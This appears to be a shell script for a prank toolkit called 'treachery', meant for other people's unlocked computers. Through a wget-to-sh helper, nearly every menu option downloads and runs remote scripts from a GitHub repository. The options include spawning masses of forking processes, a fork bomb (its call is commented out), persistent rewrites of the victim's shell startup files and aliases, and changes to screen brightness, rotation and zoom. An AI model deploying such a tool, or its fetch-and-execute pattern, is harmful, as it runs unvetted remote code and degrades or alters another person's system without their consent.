#!/bin/sh
# dash uses . not source, so this checks if that needs to be remedied
if which source 2>/dev/null >/dev/null
then
	:;
else
	alias source="."
fi
# Function declarations
webrun(){ sh -c "$(wget -qO - $1)" ; }
split_screen(){ printf "\033(0"%"`tput cols`"s"\033(B\n" | tr ' ' 'q' ; }
# funny variables
BASEURL="https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master"
B="\033[1m"
U="\033[4m"
N="\033[0m"
CHOICES="'list' 'help' '-h' 'shortlist' '-l' 'forked bom' 'forkbomb' 'gif' 'parrot' 'boykisser' 'prompt' 'brightness' 'tilt' 'rotate' 'zoom' 'mirror' 'rickroll' 'alias' 'fish' 'choo'"
# Main program
echo -n 'Hello and welcome to this framework for treachery, built by the Goblin himself, for your execution pleasure. within you will find many "useful" options, available to you through just a few command-line arguments.'"\n\n"

treachery(){
# check if input is in the form of cmdline argument, if not do it interactively
	INPUT="$@"
	if [ ! -n "${INPUT}" ]
	then
		echo -n "Please provide your choice of treachery: "
		read INPUT
		echo ""
		split_screen
	fi
# the heart of the program, does all the heavy lifting
	case "${INPUT}" in
		"1"|"list"|"help"|"-h")
			echo "available options are as follows:
	1	'list'|'help'|'-h' displays this list
	2	'shortlist' displays all options without descriptions
	3	'forked bom' summons a bunch of forks in terminals
			cleanup can be done through killing all processes named 'sh' and 'deploy_fork_bom', and _then_ closing the terminals
	4	'forkbomb' does an actual forkbomb, ${B}${U}do not use lightly${N}
			can be stopped if youre really quick with your killing
	5	'gif' gives you the choice between several different ascii gifs to display in terminal
	6	'parrot' displays a disco parrot in the terminal
	7	'boykisser' sets the users prompt to Boykisser with the caption 'You like leaving your screen unlocked, dont you' (21 lines tall)
			NB! is permanent, as it changes all* shell startup scripts, as well as .profile
			cleanup can be done by editing ~/.zshrc, ~/.bashrc, ~/.config/fish/config.fish && ~/.profile
	8	'prompt' sets the users prompt to a much less intrusive version of the boykisser (1 line tall)
			NB! is permanent, as it changes all* shell startup scripts, as well as .profile
			cleanup can be done by editing ~/.zshrc, ~/.bashrc, ~/.config/fish/config.fish && ~/.profile
	9	'brightness' sets the gamma of the screen
			1 is default brightness
	10	'tilt' tilt the screen by some factor
			0 is default tilt
	11	'rotate' rotates screen the 'regular' way
			IE: how you would rotate your monitor
			0 is default orientation
	12	'zoom' zooms the screen in by a factor
			1 is default zoom factor
	13	'mirror' reflects the screen
			normal is default value
	14	'rickroll' opens a fullscreen firefox window of Rick Astley's hit single 'Never gonna give you up'
	15	'alias' sets a bunch of aliases (to circumvent em, simply escape any of the characters in the alias)
			cleanup can be done by editing ~/.zshrc, ~/.bashrc && ~/.config/fish/config.fish
	16	'fish' fish
	17	'swap' swaps theme from light to dark, and vice versa
	18	'choo' choo choo
			"
			if [ ! "$@" = "" ]; then return; fi
			treachery
			;;
		"2"|"shortlist"|"-l")
			echo ${CHOICES}
			if [ ! "$@" = "" ]; then return; fi
			treachery
			;;
		"3"|"forked bom")
			echo "Forked bom chosen"
			webrun ${BASEURL}/assorted/forked_bom/deploy_fork_bom.sh
			;;
		"4"|"forkbomb")
			echo "Forkbomb chosen"
			# webrun ${BASEURL}/assorted/forkbomb.sh
			echo "wtf is wrong with you, choose something else"
			;;
		"5"|"gif")
			echo "Gif chosen"
			webrun ${BASEURL}/assorted/gif.sh
			;;
		"6"|"parrot")
			echo "Parrot chosen"
			webrun ${BASEURL}/assorted/parrot.sh
			;;
		"7"|"boykisser")
			echo "Boykisser chosen"
			webrun ${BASEURL}/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh
			;;
		"8"|"prompt")
			echo "Prompt chosen"
			webrun ${BASEURL}/assorted/prompt.sh
			;;
		"9"|"brightness")
			echo "Brightness chosen"
			webrun ${BASEURL}/assorted/brightne.sh
			;;
		"10"|"tilt")
			echo "Tilt chosen"
			webrun ${BASEURL}/assorted/rotate.sh
			;;
		"11"|"rotate")
			echo "Rotate chosen"
			webrun ${BASEURL}/assorted/screen.sh
			;;
		"12"|"zoom")
			echo "Zoom chosen"
			webrun ${BASEURL}/assorted/zoom.sh
			;;
		"13"|"mirror")
			echo "Mirror chosen"
			webrun ${BASEURL}/assorted/mirror.sh
			;;
		"14"|"rickroll")
			echo "Rickroll chosen"
			webrun ${BASEURL}/assorted/rickroll.sh
			;;
		"15"|"alias")
			echo "Alias chosen"
			webrun ${BASEURL}/assorted/aliases.sh
			;;
		"16"|"fish")
			echo "Fish"
			webrun ${BASEURL}/assorted/fi.sh
			;;
		"17"|"swap")
			echo "Swap chosen"
			webrun ${BASEURL}/assorted/theme.sh
			;;
		"18"|"choo")
			echo "all aboard!"
			webrun ${BASEURL}/assorted/choochoo.sh
			;;
		*)
			if [ -n "${INPUT}" ]
			then
				echo "'${INPUT}' not found, see 'list' for all available options"
			else
				echo "No input detected, abandoning treachery"
				exit
			fi
			if [ ! "$@" = "" ]; then return; fi
			read -p "try again? [y/n]: " RETRY
			if [ ! "${RETRY}" = "n" ]
			then
				treachery 
			else
				echo "Treachery canceled"
			fi
			;;
	esac
}
treachery $@
